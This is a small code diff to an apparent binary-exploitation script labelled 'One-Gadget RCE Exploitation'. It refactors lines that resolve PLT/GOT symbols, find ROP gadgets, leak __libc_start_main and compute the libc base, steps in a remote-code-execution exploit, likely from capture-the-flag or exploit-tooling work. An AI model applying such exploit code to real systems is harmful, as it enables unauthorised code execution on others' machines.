@@ -9,9 +9,9 @@ print("[*] One-Gadget RCE Exploitation")
 
 # Analyze binary
 let elf = analyze(binary)
-let plt_puts = elf["plt"]["puts"]
-let got_libc_start = elf["got"]["__libc_start_main"]
-let main_addr = elf["symbols"]["main"]
+let plt_puts = elf.plt.puts
+let got_libc_start = elf.got.__libc_start_main
+let main_addr = elf.symbols.main
 
 # Find gadgets
 let gadgets = quick_rop(binary)
@@ -35,7 +35,7 @@ print("[+] Leaked __libc_start_main:", hex(leak))
 
 # Calculate libc base dynamically
 let libc_template = Libc("ubuntu20.04")
-let libc_start_offset = libc_template["symbols"]["__libc_start_main"]
+let libc_start_offset = libc_template.symbols.__libc_start_main
 let libc_base = leak - libc_start_offset
 print("[+] Libc base:", hex(libc_base))
 
